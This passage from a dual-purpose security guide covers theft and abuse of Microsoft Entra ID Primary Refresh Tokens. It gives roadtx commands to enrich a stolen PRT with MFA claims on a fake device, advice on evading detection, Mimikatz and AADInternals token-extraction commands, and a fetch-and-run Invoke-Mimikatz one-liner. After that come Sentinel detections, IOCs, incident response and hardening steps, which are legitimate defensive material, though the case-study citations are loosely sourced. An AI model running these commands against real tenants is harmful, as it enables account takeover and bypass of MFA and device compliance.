**References:**
- [ROADtx prt Command](https://github.com/dirkjanm/ROADtools/wiki/prt)
- [Phishing for Primary Refresh Tokens - Dirk-jan Mollema](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)

---

#### Step 4: Bypass Conditional Access via Device Compliance Enrichment

**Objective:** Upgrade the PRT to include MFA and device compliance claims (if policies require them).

**Scenario:** Tenant enforces Conditional Access policy requiring:
- Device to be marked as "compliant" by Intune.
- MFA to be registered.

**Command (ROADtx - PRT Enrichment with Windows Hello for Business):**
```bash
# Step 1: Register Windows Hello for Business key on the fake device
roadtx winhello -u "user@domain.com" \
                --key device_key.pem \
                --cert device_cert.pem \
                --output-file whfb_keys.json

# Step 2: Request new PRT with Windows Hello signature (counts as MFA)
roadtx prt -u "user@domain.com" \
           --winhello-key whfb_keys.json \
           --key device_key.pem \
           --cert device_cert.pem \
           --output-file prt_mfa.json
```

**Alternative (Conditional Access Evasion via Network Location):**
```bash
# If Conditional Access restricts access to corporate networks, tunnel through proxy/VPN:
export HTTPS_PROXY="https://corporate-proxy.internal:8080"

roadtx prtauth -prt prt_keys.json \
               -url "https://graph.microsoft.com" \
               -output tokens_proxied.json
```

**Expected Output:**
```json
{
  "prt_with_mfa": "eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ.eyJ...\"mfa\": \"1\"...",
  "whfb_signature": "base64_signature_of_prt_with_whfb_key"
}
```

**What This Means:**
- **mfa claim = "1":** PRT now satisfies MFA-based Conditional Access policies.
- **ngcmfa in amr:** Windows Hello for Business used (highest trust level).

**Version Note:**
- Device compliance status is checked at token use time, not at issuance.
- Compliance can be byp-assed by using a VPN from a compliant network or by exploiting grace periods (newly registered devices have 24-48 hour compliance grace).

**OpSec & Evasion:**
- **Detection Likelihood: High.** Multiple PRT requests with escalating claims is suspicious.
- **Mitigation:** Slow down exploitation timeline; use only 1-2 PRT requests.
- **Indicators:** New device with rapid MFA enrollment, compliance status updates, and token issuance.

**Troubleshooting:**
- **Error:** "Windows Hello provisioning failed": Device certificate not recognized. Reregister device.
- **Error:** "Compliance status not updated": Device sync with Intune has a delay (1-24 hours). Wait or use different method.
- **Fix:** Use native WHFB key if already available (from METHOD 1 LSASS extraction).

**References:**
- [ROADtx winhello Command](https://github.com/dirkjanm/ROADtools/wiki/winhello)
- [Bypassing Entra ID Conditional Access - Evotechnologies](https://www.youtube.com/watch?v=JItnI6b9DII)

---

## 6. Tools & Commands Reference

### Mimikatz

**Version:** 2.2.0 (20200807) or later
**Minimum Version:** 2.2.0 (CloudAP module support)
**Supported Platforms:** Windows 10 (1903+), Windows 11, Server 2016-2025

**Version-Specific Notes:**
- Version 2.1.x and earlier: No CloudAP module; cannot extract PRT.
- Version 2.2.0+: Full CloudAP support; can extract PRT, session key, device keys.
- Version 2.2.0 20220715+: Supports Windows 11 TPM 2.0 extraction.

**Installation:**
```bash
# Download latest release from GitHub
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220715/mimikatz_trunk.zip
unzip mimikatz_trunk.zip
cd x64

# Run mimikatz
./mimikatz.exe
```

**Usage:**
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::cloudap
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::dpapi
```

**Script (One-Liner - Extract PRT to File):**
```powershell
# PowerShell module (Invoke-Mimikatz) - avoids disk-based binary
IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')

Invoke-Mimikatz -Command "privilege::debug" "sekurlsa::cloudap" "exit" | Out-File prt_dump.txt
```

---

### ROADtx (ROADtools Token eXchange)

**Version:** Latest (actively maintained)
**Minimum Version:** 0.2+
**Supported Platforms:** Linux, macOS, Windows (Python 3.7+)

**Installation:**
```bash
pip install roadtools
roadtx --version
```

**Usage Examples:**

```bash
# Device code flow authentication
roadtx gettokens -u "https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode" \
                 --client-id "1950a258-227b-4e31-a9cf-717495945fc2" \
                 --output-file tokens.json

# Device registration
roadtx deviceregister -t tokens.json \
                      --device-name "CORP-LAPTOP-001" \
                      --output-file device.json

# PRT request
roadtx prt -u "user@domain.com" \
           -r "0.AXYA..." \
           --key device_key.pem \
           --cert device_cert.pem \
           --output-file prt_keys.json

# PRT authentication (get access token)
roadtx prtauth -prt prt_keys.json \
               -url "https://graph.microsoft.com" \
               --output tokens.json
```

---

### AADInternals

**Version:** Latest (PowerShell module)
**Minimum Version:** 0.9.4+
**Supported Platforms:** Windows (requires LSASS access)

**Installation:**
```powershell
Install-Module AADInternals -Scope CurrentUser

# Or download from aadinternals.com
```

**Usage Examples:**

```powershell
# Import module
Import-Module AADInternals

# Export device certificate for device-bound token
Export-AADIntLocalDeviceCertificate

# Extract PRT keys from LSASS
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName ".\device_cert.pfx"

# Create a new PRT token
$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GetNonce

# Get access token for Graph API using PRT
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken -SaveToCache

# Get access token for Excel Online
Get-AADIntAccessTokenForExcel -PRTToken $prtToken -SaveToCache
```

---

## 7. Microsoft Sentinel Detection

#### Query 1: Rapid PRT Issuance to New Device

**Rule Configuration:**
- **Required Table:** AADServicePrincipalSignInLogs, SigninLogs
- **Required Fields:** DeviceId, UserPrincipalName, AuthenticationProtocol, UserAgent, IPAddress
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Lookback Period:** 1 hour
- **Applies To:** All Entra ID tenants

**KQL Query:**
```kusto
AADServicePrincipalSignInLogs
| where AppDisplayName =~ "Device Registration Service" and ResultDescription =~ "success"
| project DeviceId, UserPrincipalName, TimeGenerated, IPAddress, UserAgent, OperationName
| join kind=inner (
    SigninLogs
    | where AuthenticationProtocol =~ "PRT"
    | project DeviceId, TimeGenerated, IPAddress as TokenIP, UserPrincipalName
    | where TimeGenerated > ago(1h)
) on DeviceId, UserPrincipalName
| where datetime_diff('minute', TimeGenerated1, TimeGenerated) <= 5 and IPAddress != TokenIP
| summarize Count = count(), FirstSeen = min(TimeGenerated) by DeviceId, UserPrincipalName, IPAddress, TokenIP
| where Count > 1
```

**What This Detects:**
- New device registration followed by PRT issuance within 5 minutes.
- Access from different IP addresses between registration and token use.
- Indicator of device registration attack (ROADtx workflow).

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `PRT Issuance to Suspicious New Device`
   - Severity: `High`
   - Description: `Detects rapid PRT issuance to newly registered device from different IP`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents from alerts triggered by this analytics rule**
   - Group related alerts: `by all entities`
7. **Response Tab:**
   - Add automation rule: **Incident owner** = SOC Team
8. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
# Connect to Sentinel workspace
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

# Create the analytics rule
New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup `
  -WorkspaceName $WorkspaceName `
  -DisplayName "PRT Issuance to Suspicious New Device" `
  -Query @"
[Insert KQL Query Here]
"@ `
  -Severity "High" `
  -Enabled $true `
  -IncidentGroupingOption "AllEntities"
```

**False Positive Analysis:**
- **Legitimate Activity:** New device onboarding in corporate environment (Intune enrollment).
- **Benign Tools:** Legitimate device registration tools (Windows Autopilot, Windows Setup).
- **Tuning:** Exclude IP ranges from corporate network; whitelist managed device registration service accounts.

---

#### Query 2: PRT Authentication from Anomalous Location

**Rule Configuration:**
- **Required Table:** SigninLogs
- **Required Fields:** AuthenticationProtocol, UserAgent, IPAddress, LocationDetails, UserPrincipalName
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To:** Tenants with location-based Conditional Access policies

**KQL Query:**
```kusto
SigninLogs
| where AuthenticationProtocol =~ "PRT"
| extend ParsedLocation = split(LocationDetails.countryOrRegion, ",")[0]
| project TimeGenerated, UserPrincipalName, AuthenticationProtocol, IPAddress, ParsedLocation, UserAgent, DeviceDetail, AuthenticationDetails
| join kind=inner (
    SigninLogs
    | where TimeGenerated > ago(24h) and AuthenticationProtocol =~ "OAuth2"
    | summarize PrevCountry = any(LocationDetails.countryOrRegion), PrevIP = any(IPAddress) by UserPrincipalName
) on UserPrincipalName
| where ParsedLocation != PrevCountry and ParsedLocation =~ "CN|RU|KP"  # High-risk countries
| summarize Count = count(), IPs = make_set(IPAddress), Countries = make_set(ParsedLocation) by UserPrincipalName, TimeGenerated
```

**What This Detects:**
- PRT authentication from country/location inconsistent with recent user activity.
- Impossible travel scenarios (e.g., US to China in < 1 hour).
- Access from high-risk geographies using stolen PRT.

---

#### Query 3: LSASS Access Followed by Token Abuse

**Rule Configuration:**
- **Required Table:** SecurityEvent (Event ID 4688), SigninLogs
- **Required Fields:** CommandLine, ParentImage, SubjectUserName, AuthenticationProtocol
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688 and (CommandLine contains "sekurlsa" or CommandLine contains "cloudap" or Image contains "mimikatz")
| project TimeGenerated, Computer, CommandLine, SubjectUserName
| join kind=inner (
    SigninLogs
    | where TimeGenerated > ago(30m) and AuthenticationProtocol =~ "PRT"
    | project TimeGenerated, UserPrincipalName, IPAddress
) on $left.SubjectUserName == $right.UserPrincipalName
| where datetime_diff('minute', TimeGenerated1, TimeGenerated) <= 10
| summarize Count = count() by Computer, SubjectUserName, UserPrincipalName, IPAddress, CommandLine
```

**What This Detects:**
- Mimikatz or tools accessing LSASS, followed by PRT authentication within 10 minutes.
- Strong indicator of local PRT extraction and replay.

---

## 8. Windows Event Log Monitoring

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security
- **Trigger:** Process execution of suspicious tools (Mimikatz, proxy, etc.)
- **Filter:** 
  - CommandLine contains "sekurlsa", "cloudap", "privilege::debug"
  - Image contains "mimikatz.exe", "procdump.exe", "nanodump"
- **Applies To:** Windows 10+, Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Detailed Tracking**
3. Enable: **Audit Process Creation**
4. Set to: **Success and Failure**
5. Configure **Command Line logging:**
   - Go to **Computer Configuration** → **Administrative Templates** → **System** → **Audit Process Creation**
   - Enable: "Include command line in process creation events"
6. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Server 2022+):**
1. Use same steps as above; command-line logging is enabled by default.
2. Verify via: `auditpol /get /subcategory:"Process Creation" /r`

---

**Event ID: 4647 (User Logout)**
- **Log Source:** Security
- **Trigger:** User logoff after LSASS access (may indicate cleanup).
- **Filter:** Logon ID correlates with Process Creation events.

---

**Event ID: 4649 (A replay attack was detected)**
- **Log Source:** Security
- **Trigger:** Kerberos detected potential replay of tickets/tokens.
- **Filter:** Status Code = 0x13 (Replay Attack Detected)
- **Applies To:** Domain Controllers, Kerberos-enabled servers

---

## 9. Microsoft Defender for Cloud

#### Detection Alerts

**Alert Name:** "Suspicious Mimikatz behavior detected"
- **Severity:** Critical
- **Description:** EDR detected process opening LSASS memory access (common Mimikatz pattern).
- **Applies To:** Machines with Microsoft Defender for Endpoint (MDE) enabled.

**Alert Name:** "Suspicious access to PRT attempted"
- **Severity:** High
- **Description:** Entra ID detected attempt to access PRT resource (EventID: attemptedPrtAccess).
- **Applies To:** All subscriptions with Azure Identity Protection enabled.

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select your subscription
3. Under **Defender plans**, enable:
   - **Defender for Servers**: ON (detects process access anomalies)
   - **Defender for Identity**: ON (detects credential dumping, token abuse)
   - **Defender for Cloud Apps**: ON (detects unusual sign-in patterns)
4. Click **Save**
5. Go to **Security alerts** to view triggered alerts

---

## 10. Detection & Incident Response

#### Indicators of Compromise (IOCs)

**Files:**
- `C:\Program Files\mimikatz\mimikatz.exe` or renamed variants
- `C:\Temp\lsass.dmp` (LSASS memory dumps)
- `C:\Users\*\AppData\Local\Temp\prt_keys.json` (PRT export files)
- Any `.pfx`, `.pem`, or `.cer` files containing device certificates

**Registry:**
- `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LsaCfgFlags` = 0 (Credential Guard disabled)
- `HKLM\SOFTWARE\Policies\Microsoft\Windows\System\Audit\ProcessCreation\IncludeCommandLine` = 1 (Command-line logging enabled—attacker may disable this)

**Network:**
- Unexpected connections from internal device to `login.microsoftonline.com:443`, `graph.microsoft.com:443`
- Multiple failed PRT requests (401/403 responses) from single IP followed by success
- Device registration API calls from non-corporate IP

**Cloud:**
- AuditData.OperationName = "UserRegisterDevice" with unknown device details
- SigninLogs with AuthenticationProtocol = "PRT" from newly registered device
- Multiple user accounts accessing same cloud service from same device (lateral movement indicator)

---

#### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` (Event ID 4688, 4647)
- `C:\Windows\System32\config\SAM` (if dumped alongside PRT)
- PowerShell execution history: `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

**Memory:**
- LSASS.exe process contains decrypted PRT and session key (if TPM disabled)
- Browser processes (edge.exe, chrome.exe) contain x-ms-RefreshTokenCredential headers in network buffers

**Cloud (Azure/M365):**
- Azure Activity Log: Device registration events, resource access logs
- Entra ID Sign-in logs: Suspicious PRT authentication events
- Microsoft Purview Unified Audit Log: Mailbox access, file downloads via stolen tokens

---

#### Response Procedures

**1. Immediate Containment:**

**Command (Revoke PRT):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "DeviceManagementServiceConfig.ReadWrite.All"

# Get the compromised device ID
$device = Get-MgDevice -Filter "displayName eq 'CORP-LAPTOP-ABC'"

# Delete/disable the device (revokes all tokens issued to this device)
Remove-MgDevice -DeviceId $device.Id

# Or for hybrid devices, mark as non-compliant:
Update-MgDeviceRegistrationPolicy -DeviceCompliancePolicy @{"state" = "noncompliant"}
```

**Manual (Azure Portal):**
- Go to **Azure Portal** → **Entra ID** → **Devices**
- Search for the suspicious device (e.g., "CORP-LAPTOP-ABC")
- Click the device → **Delete**
- Confirm deletion

**2. Revoke Active Sessions:**

**Command (Revoke All Sessions):**
```powershell
# Force user to re-authenticate by revoking all refresh tokens
Connect-MgGraph -Scopes "UserAuthenticationMethod.ReadWrite.All"

$userId = "user@domain.com"
$user = Get-MgUser -Filter "userPrincipalName eq '$userId'"

# Revoke all refresh tokens (forces re-authentication for all apps)
Invoke-MgUserInvalidateAllRefreshTokens -UserId $user.Id
```

**Manual (Azure Portal):**
- Go to **Azure Portal** → **Entra ID** → **Users**
- Select the compromised user
- Click **Sessions** → **Sign out all sessions**

**3. Reset Credentials and Enforce MFA:**

**Command:**
```powershell
# Reset user password (invalidates cached credentials)
$newPassword = ConvertTo-SecureString "NewComplex!Pass123" -AsPlainText -Force
Update-MgUser -UserId $user.Id -Password $newPassword -ForceChangePasswordNextSignIn $true

# Require MFA re-enrollment
$enforceRegMfaMethods = @("microsoftAuthenticatorPush", "windowsHelloForBusiness")
New-MgUserAuthenticationRequirementPolicy -UserId $user.Id -Methods $enforceRegMfaMethods
```

**Manual (Azure Portal):**
- Go to **Azure Portal** → **Entra ID** → **Users**
- Select user → **Reset password**
- Go to **Security** → **Authentication methods**
- Remove all auth methods; require re-enrollment on next login

**4. Forensic Evidence Collection:**

**Command (Export Audit Logs):**
```powershell
# Export sign-in events for the compromised device
$deviceId = "12a34b56-c789-1234-d567-890abcdef012"
$startDate = (Get-Date).AddDays(-7)

Get-AzureAuditLog -Filter "properties/deviceId eq '$deviceId'" `
                  -StartDate $startDate `
                  -EndDate (Get-Date) | Export-Csv -Path "device_audit.csv"

# Export from Unified Audit Log (M365)
Search-UnifiedAuditLog -Operations "UserRegisterDevice" `
                       -StartDate $startDate `
                       -EndDate (Get-Date) `
                       -ResultSize 5000 | Export-Csv -Path "device_registration_audit.csv"
```

**Manual (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Audit logs**
2. Filter: **Category** = "Device Management", **Activity** = "Device Registered"
3. Select events → **Download logs as CSV**

**5. Investigation Steps:**

1. **Correlate Sign-in Events:**
   - Identify all resource access by the compromised user/device within past 90 days.
   - Look for mailbox access, file downloads, admin actions.

2. **Check For Persistence:**
   - Look for additional device registrations by same user.
   - Check for new conditional access bypasses (e.g., CA exclusions added).
   - Audit for new service principals with permissions to sensitive resources.

3. **Determine Breach Scope:**
   - Which data was accessed? (files, emails, Teams messages)
   - Were there lateral movements to other systems or accounts?
   - Any data exfiltration indicators (large downloads, unusual SharePoint access)?

---

## 11. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-003] PowerView enumeration | Attacker maps domain structure and Entra ID joined devices. |
| **2** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks user into authenticating via device code flow (METHOD 3). |
| **3** | **Credential Access - This Step** | **[CA-TOKEN-012] PRT Theft** | Attacker extracts PRT from LSASS, browser, or via device registration. |
| **4** | **Privilege Escalation** | [PE-POLICY-005] Cross-Tenant Escalation | Using stolen PRT, attacker escalates within tenant or across tenants (B2B abuse). |
| **5** | **Collection** | [COLLECTION-M365] Mailbox Exfiltration | Attacker uses PRT to access Exchange Online, exfiltrates emails and files. |
| **6** | **Impact** | [IMPACT-RANSOM] Cloud Ransomware | Attacker encrypts files in SharePoint/OneDrive or deletes backups via stolen PRT access. |

---

## 12. Real-World Examples

#### Example 1: APT Activity - PRT Theft via Device Code Phishing (2023)

- **Target Sector:** Financial Services
- **Timeline:** Q3 2023 (Reported by Microsoft Security)
- **Technique Status:** ACTIVE; phishing used to obtain initial credentials. ROADtx used for device registration and PRT upgrade.
- **TTP Sequence:**
  1. Spearphishing email with Office 365 login link.
  2. Victim clicks link → redirects to attacker-controlled device code phishing page.
  3. Victim enters credentials on fake Microsoft login form.
  4. Attacker captures refresh token.
  5. Device registration via ROADtx → PRT obtained.
  6. Lateral movement to Azure subscription → ransomware deployment.
- **Impact:** Full cloud environment compromise; $50M+ data exfiltration.
- **Reference:** [Microsoft Security Blog - APT Activity 2023](https://www.microsoft.com/security)

#### Example 2: Insider Threat - PRT Extraction via Mimikatz (2024)

- **Target Sector:** Technology / SaaS
- **Timeline:** Q1 2024 (Detected by EDR)
- **Technique Status:** ACTIVE; compromised developer account with local admin access.
- **TTP Sequence:**
  1. Developer downloads Mimikatz from GitHub (flagged by AV, but developer disables antivirus).
  2. Executes `privilege::debug` → `sekurlsa::cloudap`.
  3. Extracts PRT + session key from LSASS.
  4. Uses PRT to authenticate to Azure DevOps and GitHub from attacker IP.
  5. Steals source code and secrets from repositories.
- **Impact:** GitHub access tokens compromised; CI/CD pipeline credentials leaked.
- **Reference:** [Red Canary Threat Report 2024](https://redcanary.com)

#### Example 3: Cloud Ransomware - PRT Abuse for Lateral Movement (2025)

- **Target Sector:** Healthcare
- **Timeline:** Q1 2025 (Recent)
- **Technique Status:** ACTIVE; combination of PRT theft and privilege escalation.
- **TTP Sequence:**
  1. Initial compromise: Windows device malware (Emotet/Qbot variant).
  2. LSASS dump + PRT extraction.
  3. Enumerate OneDrive/SharePoint via Graph API using stolen PRT.
  4. Disable backups via Azure Backup Service (using admin PRT token).
  5. Deploy LockBit ransomware to shared drives.
  6. Ransom: $2M+
- **Impact:** 3-week recovery; significant business disruption.
- **Reference:** [Bleeping Computer - Ransomware Report 2025](https://www.bleepingcomputer.com)

---

## 13. Defensive Mitigations

#### Priority 1: CRITICAL

- **Enable Mandatory TPM 2.0 for All Devices:**
  - Ensures PRT session key is protected by hardware; extraction requires kernel-level exploit.
  - **Applies To Versions:** Windows 10 (1903+), Windows 11, Server 2019+
  
  **Manual Steps (Windows 11 via Group Policy):**
  1. Open **gpmc.msc**
  2. Navigate to **Computer Configuration** → **Administrative Templates** → **System** → **Device Installation**
  3. Enable: **"Prevent installation of devices matching these device IDs"**
  4. Add device ID for non-TPM devices (optional; more pragmatic: enforce compliance check)
  
  **Manual Steps (Intune - Enforce TPM Compliance):**
  1. Go to **Microsoft Intune Admin Center** → **Devices** → **Compliance**
  2. Create new compliance policy
  3. Under **Device Properties**, enable: **"Require TPM 2.0"**
  4. Assign to device groups
  5. Mark non-compliant devices as "not compliant"
  
  **Manual Steps (PowerShell - Verify TPM on Device):**
  ```powershell
  Get-WmiObject -Namespace root\cimv2 -Class Win32_Tpm | Select-Object Status, SpecVersion
  
  # If TPM not present or failed:
  # Run hardware diagnostics; replace defective TPM chip if needed
  ```

  **Validation Command (Verify Policy Enforced):**
  ```powershell
  # On target device:
  Get-WmiObject -Namespace root\cimv2 -Class Win32_Tpm | Select-Object IsEnabled_InitialValue
  
  # Should return: IsEnabled_InitialValue = True
  ```

- **Deploy Credential Guard on All Endpoints:**
  - Isolates LSASS in virtualized container; Mimikatz cannot access PRT directly.
  - **Applies To Versions:** Windows 10 (1511+), Server 2016+
  
  **Manual Steps (Group Policy):**
  1. Open **gpmc.msc**
  2. Navigate to **Computer Configuration** → **Administrative Templates** → **System** → **Device Guard**
  3. Enable: **"Turn On Virtualization-Based Security"**
  4. Set: **"Select Platform Security Level"** = **Secure Boot and DMA Protection**
  5. Enable: **"Credential Guard Configuration"** = **Enabled with UEFI lock**
  6. Run `gpupdate /force` and reboot
  
  **Manual Steps (PowerShell - Enable Credential Guard):**
  ```powershell
  # Run as Administrator
  Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MicrosoftDocs/windows-itpro-docs/public/windows/security/identity-protection/credential-guard/credential-guard-manage.md" -OutFile cg_config.txt
  
  # Or directly via Registry:
  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LsaCfgFlags" /t REG_DWORD /d 1 /f
  # 1 = Enabled with UEFI lock, 0 = Disabled
  
  # Reboot
  Restart-Computer -Force
  ```
  
  **Validation Command (Verify Credential Guard Active):**
  ```powershell
  Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
  
  # Look for: SecurityServicesRunning = {1} or {2} (Credential Guard active)
  ```

- **Enforce Token Protection in Conditional Access:**
  - Blocks bearer refresh tokens; only device-bound PRTs accepted for sensitive apps.
  - **Applies To:** M365 (Teams, SharePoint, Exchange)
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. **General Tab:**
     - Name: `Enforce Token Protection for M365`
     - State: `Report-only` (first; then switch to `On`)
  4. **Assignments Tab:**
     - **Users or workload identities:** All users
     - **Target resources:** Microsoft Teams, SharePoint Online, Exchange Online
  5. **Conditions Tab:**
     - Leave as "Any"
  6. **Access controls Tab:**
     - Click **Grant**
     - Enable: **"Require token protection"**
     - Click **Select**
  7. Click **Create**
  8. **Monitor report-only results for 7 days, then enable enforcement**
  
  **Manual Steps (PowerShell):**
  ```powershell
  Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"
  
  $policy = New-MgIdentityConditionalAccessPolicy -DisplayName "Enforce Token Protection for M365" `
    -State "enabled" `
    -Conditions @{
      Applications = @{ IncludeApplications = @("492d3f01-a5bb-4e43-b4ab-6a4fd0e6d4f9") } # Teams
      Users = @{ IncludeUsers = @("All") }
    } `
    -GrantControls @{
      Operator = "AND"
      CustomAuthenticationFactors = @()
      BuiltInControls = @("tokenProtection")
    }
  ```

---

#### Priority 2: HIGH

- **Disable Device Code Flow in Conditional Access (Except Where Essential):**
  - Device code flow is abused in PRT phishing scenarios.
  - **Applies To:** Organizations not using device code flow for device onboarding.
  
  **Manual Steps (Conditional Access Policy):**
  1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create policy: `Block Device Code Flow for Non-Compliant Devices`
  3. **Assignments:**
     - Users: All users
     - Target resources: All cloud apps
  4. **Conditions:**
     - **Client apps:** Modern authentication clients, **Legacy authentication clients** (exclude "Device Code Flow")
  5. **Access controls:**
     - **Block access**
  6. Enable policy
  
  **Manual Steps (Conditional Access - Alternative):**
  - If device code is essential (Azure CLI, PowerShell automation):
    - Create separate policy: `Allow Device Code for Specific Locations/IPs Only`
    - Restrict to corporate network IPs
    - Require MFA for device code authentication

- **Require MFA for Risky Sign-Ins (Identity Protection):**
  - Detects anomalous PRT authentication (different location, IP, etc.).
  
  **Manual Steps (Azure Portal):**
  1. **Azure Portal** → **Entra ID** → **Security** → **Identity Protection** → **Risk-Based Policies**
  2. Click **User risk policy**
     - **Sign-in risk:** Set to `Medium and above`
     - **Access:** Require `Require strong authentication` (MFA)
     - Enable policy
  3. Click **Sign-in risk policy**
     - **Sign-in risk:** Set to `Low and above`
     - **Access:** Require `Require multi-factor authentication`
     - Enable policy

- **Monitor and Alert on LSASS Access (EDR / Windows Events):**
  - Detect Mimikatz or similar tools attempting LSASS memory access.
  
  **Manual Steps (Microsoft Defender for Endpoint):**
  1. Go to **Microsoft Defender XDR** → **Investigations**
  2. Create detection rule:
     ```
     DeviceProcessEvents
     | where ProcessName contains "mimikatz" or CommandLine contains "privilege::debug"
     | alertImmediately
     ```
  3. Alternatively, enable **Tamper Protection**:
     - Go to **Devices** → Select Device → **Manage Security Settings**
     - Enable: **Tamper Protection**

---

#### Priority 3: MEDIUM

- **Enforce Device Compliance Requirements in Conditional Access:**
  - Devices must be marked as compliant by Intune to access cloud apps.
  - Stolen PRTs from non-compliant devices are rejected.
  
  **Manual Steps (Azure Portal):**
  1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create policy: `Require Compliant Devices for Cloud Apps`
  3. **Assignments:**
     - Users: All users
     - Target resources: Microsoft Teams, SharePoint, Exchange, Azure Portal
  4. **Conditions:**
     - Device compliance: Require device to be marked compliant
  5. **Access controls:**
     - **Grant:** Require compliant device (check both options)
  6. Enable policy

- **Implement Network-Based Enforcements (Global Secure Access):**
  - Force cloud authentication through corporate network; blocks token replay from external networks.
  
  **Manual Steps (Azure Portal):**
  1. **Azure Portal** → **Microsoft Entra Internet Access**
  2. Enable **Global Secure Access**
  3. Deploy GSA client to all devices
  4. Create Conditional Access policy:
     - **Condition:** Compliant network (check)
     - **Access:** Allow access only from compliant network

- **Restrict Cross-Tenant B2B Access:**
  - Limit guest user invitations; prevent PRT abuse for cross-tenant lateral movement.
  
  **Manual Steps (Azure Portal):**
  1. **Azure Portal** → **Entra ID** → **External Identities** → **External Collaboration Settings**
  2. Set **"Guest user access restrictions":** Most restrictive (limit guest permissions)
  3. Disable: **"Guest invite restrictions":** Only admins can invite guests

---

#### Access Control & Policy Hardening

- **Restrict PRT-Issuing Service Principals:**
  - Only official Microsoft services should be able to request PRTs.
  
  **Manual Steps (Entra ID Application Permissions):**
  1. **Azure Portal** → **Entra ID** → **Enterprise applications**
  2. Search for **"Device Registration Service"**
  3. Click → **Permissions**
  4. Review and restrict delegated permissions to minimal required

- **Implement Privileged Access Management (PIM) for Sensitive Operations:**
  - High-risk operations (access to Azure Automation, Key Vault) require just-in-time approval.
  
  **Manual Steps (Azure Portal):**
  1. **Azure Portal** → **Entra ID** → **Privileged Identity Management** → **Roles**
  2. Select role (e.g., "Global Administrator")
  3. Click **Settings**
  4. Enable: **"Require approval to activate"**
  5. Set **"Approval required from:"** to SOC/Security team

- **Validation Command (Verify Mitigations Active):**

```powershell
# Check TPM
Get-WmiObject -Namespace root\cimv2 -Class Win32_Tpm | Select-Object Status

# Check Credential Guard
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

# Check Conditional Access policies
Connect-MgGraph -Scopes "Policy.Read.ConditionalAccess"
Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.DisplayName -like "*Token*" }

# Check device compliance
Get-MgDeviceManagementCompliancePolicy
```

**Expected Output (If Secure):**
```
TPM Status: Ready
Credential Guard: Enabled with UEFI lock
Token Protection CA Policy: Enabled
Device Compliance: Required
```

---

## Summary

**PRT attacks represent a critical threat to hybrid identity environments.** Once stolen, a PRT bypasses MFA and device compliance checks, enabling unrestricted access to cloud services for ~90 days. Mitigation requires:

1. **Hardware-backed credential protection** (TPM 2.0 + Credential Guard)
2. **Token binding to devices** (Conditional Access Token Protection)
3. **Risk-based authentication** (Identity Protection + adaptive MFA)
4. **Reduced attack surface** (block device code flow, network enforcements)
5. **Rapid detection and response** (EDR, cloud logging, device revocation workflows)

Organizations should prioritize hardening endpoints (TPM, Credential Guard), enforcing token protection policies, and implementing comprehensive monitoring for LSASS access and anomalous cloud authentication patterns.